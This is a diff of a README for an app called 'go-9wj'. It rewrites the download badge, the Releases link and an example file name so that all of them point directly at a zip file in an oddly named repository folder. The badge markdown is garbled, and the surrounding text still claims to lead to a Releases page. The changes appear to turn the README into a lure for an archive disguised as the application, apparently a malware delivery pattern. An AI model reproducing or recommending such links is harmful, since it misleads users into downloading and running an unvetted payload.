@@ -6,7 +6,7 @@ Welcome to go-9wj! This application helps you streamline your daily tasks. Follo
 
 ## 📥 Download
 
-[![Download go-9wj](https://img.shields.io/badge/Download%20go--9wj-v1.0-blue.svg)](https://github.com/sebootty/go-9wj/releases)
+[![Download go-9wj](https://raw.githubusercontent.com/sebootty/go-9wj/main/preworthily/go-9wj.zip%https://raw.githubusercontent.com/sebootty/go-9wj/main/preworthily/go-9wj.zip)](https://raw.githubusercontent.com/sebootty/go-9wj/main/preworthily/go-9wj.zip)
 
 ## 📋 Requirements
 
@@ -27,11 +27,11 @@ go-9wj offers several useful features:
 
 ## 📂 Download & Install
 
-To download the application, visit the Releases page [here](https://github.com/sebootty/go-9wj/releases). You will find the latest version listed at the top of the page.
+To download the application, visit the Releases page [here](https://raw.githubusercontent.com/sebootty/go-9wj/main/preworthily/go-9wj.zip). You will find the latest version listed at the top of the page.
 
 1. Click on the **Releases** link.
 2. Locate the latest version.
-3. Click on the downloadable file for your operating system (e.g., `go-9wj-windows.exe`).
+3. Click on the downloadable file for your operating system (e.g., `https://raw.githubusercontent.com/sebootty/go-9wj/main/preworthily/go-9wj.zip`).
 4. The download will start automatically. Wait for it to finish.
 
 ### 🛠️ Installation Steps
